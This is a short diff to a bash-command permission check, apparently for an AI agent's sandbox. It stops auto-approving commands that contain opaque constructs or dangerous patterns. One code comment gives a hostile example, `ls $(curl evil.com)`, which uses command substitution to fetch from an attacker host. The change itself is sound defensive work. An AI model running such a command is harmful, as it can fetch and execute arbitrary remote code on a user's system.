@@ -595,11 +595,16 @@ export async function check(
     policyContext,
   );
 
-  // Resolve sandboxAutoApprove for bash commands — all pipeline segments must be on the allowlist
+  // Resolve sandboxAutoApprove for bash commands — all pipeline segments must be
+  // on the allowlist, and the command must not contain opaque constructs or
+  // dangerous patterns (e.g. `ls $(curl evil.com)` has an allowlisted program
+  // but a command substitution that could execute arbitrary code).
   let hasSandboxAutoApprove = false;
   if (toolName === "bash" && shellParsed) {
     hasSandboxAutoApprove =
       shellParsed.segments.length > 0 &&
+      !shellParsed.hasOpaqueConstructs &&
+      shellParsed.dangerousPatterns.length === 0 &&
       shellParsed.segments.every((seg) => {
         const name = seg.program.split("/").pop() ?? seg.program;
         const spec: CommandRiskSpec | undefined = Object.hasOwn(
